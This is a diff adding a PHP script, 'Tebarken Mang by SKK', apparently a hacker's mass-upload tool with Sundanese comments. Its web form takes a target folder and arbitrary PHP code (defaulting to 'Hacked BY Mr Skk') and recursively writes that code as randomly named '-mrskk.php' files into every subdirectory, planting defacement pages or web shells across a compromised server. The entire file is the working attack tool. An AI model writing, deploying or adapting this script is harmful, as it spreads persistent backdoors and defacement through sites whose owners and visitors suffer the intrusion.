@@ -1,0 +1,64 @@
+<?php
+
+echo "<title>Tebarken Mang by SKK</title>";
+echo "<link href='http://fonts.googleapis.com/css?family=Electrolize' rel='stylesheet' type='text/css'>";
+echo "<style>
+    body {
+        background-color: #5C4033;
+        color: black;
+        font-family: 'Electrolize', sans-serif;
+    }
+    .container {
+        text-align: center;
+        margin-top: 50px;
+    }
+    img {
+        width: 100px;
+        height: auto;
+    }
+    input, textarea {
+        color: lime;
+        background-color: #000000;
+    }
+</style>";
+
+echo "<body><div class='container'>";
+echo "<form method='POST'>";
+echo "<img src='https://res.cloudinary.com/di1pwoapk/image/upload/v1741152887/skk_lq8ul0.png'>";
+echo "<hr color='black'><br><font color='black'>Target Folder</font><br>";
+echo "<input type='text' name='base_dir' value='".getcwd ()."'><br><br>";
+echo "<font color='black'>Script php</font><br><textarea cols='25' rows='8' name='index'>Hacked BY Mr Skk</textarea><br>";
+echo "<input type='submit' value='TEBARKEN MANG'></form></div></body>";
+
+function generateRandomFileName($length = 10) {
+    return bin2hex(random_bytes($length)); // Ngahasilkeun string acak
+}
+
+function uploadToAllDirs($dir, $content) {
+    foreach (scandir($dir) as $file) {
+        if ($file == '.' || $file == '..') continue;
+        
+        $path = "$dir/$file";
+        if (is_dir($path)) {
+            $filename = generateRandomFileName() . "-mrskk.php"; // Nama file acak
+            $targetFile = "$path/$filename";
+            if (file_put_contents($targetFile, $content)) {
+                echo "<hr color='black'>>> <font color='black'>Uploaded: $targetFile</font> <font color='lime'>(✔)</font>";
+            }
+            uploadToAllDirs($path, $content);
+        }
+    }
+}
+
+if (isset ($_POST['base_dir'])) {
+    $baseDir = $_POST['base_dir'];
+    if (!file_exists($baseDir)) {
+        die("$baseDir Not Found!<br>");
+    }
+    if (!is_dir($baseDir)) {
+        die("$baseDir Is Not A Directory!<br>");
+    }
+    uploadToAllDirs($baseDir, $_POST['index']);
+}
+
+?>
